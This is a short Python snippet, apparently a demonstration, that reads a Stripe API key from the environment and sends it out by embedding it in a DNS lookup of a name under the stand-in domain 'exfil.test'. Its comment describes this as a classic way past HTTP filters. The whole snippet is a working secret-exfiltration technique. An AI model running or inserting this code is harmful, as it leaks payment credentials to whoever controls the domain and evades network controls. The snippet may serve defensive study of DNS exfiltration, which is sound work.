# Smuggling the key out in a DNS name, a classic way past HTTP filters.
import os, socket
label = os.environ["STRIPE_API_KEY"][:60]
try:
    socket.getaddrinfo(label + ".exfil.test", 80)
    print("resolved")
except OSError as e:
    print("lookup failed", type(e).__name__)
